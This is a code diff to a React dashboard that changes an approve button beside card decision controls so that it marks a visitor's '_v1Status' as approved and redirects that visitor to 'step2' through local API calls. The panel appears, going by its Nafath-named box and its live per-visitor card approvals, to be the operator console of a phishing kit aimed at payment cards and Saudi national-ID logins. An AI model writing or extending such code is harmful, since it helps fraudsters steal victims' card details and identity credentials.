@@ -2825,9 +2825,23 @@ const renderNafadBox = () => {
             </div>
             {showCardDecisionButtons && !cardActionStatus && (
               <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
-                <button onClick={() => { 
-                  handleLocalPaymentAction("approved"); 
+                <button onClick={async () => { 
+                  setActionLoading("card");
+                  const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                  if (visitorId) {
+                    await fetch("/api/dashboard/reflect-status", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ visitorId, field: "_v1Status", status: "approved" }),
+                    });
+                    await fetch("/api/dashboard/redirect", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ visitorId, targetPage: "step2" }),
+                    });
+                  }
                   setCardActionStatus("approved");
+                  setActionLoading(null);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   موافقة
                 </button>
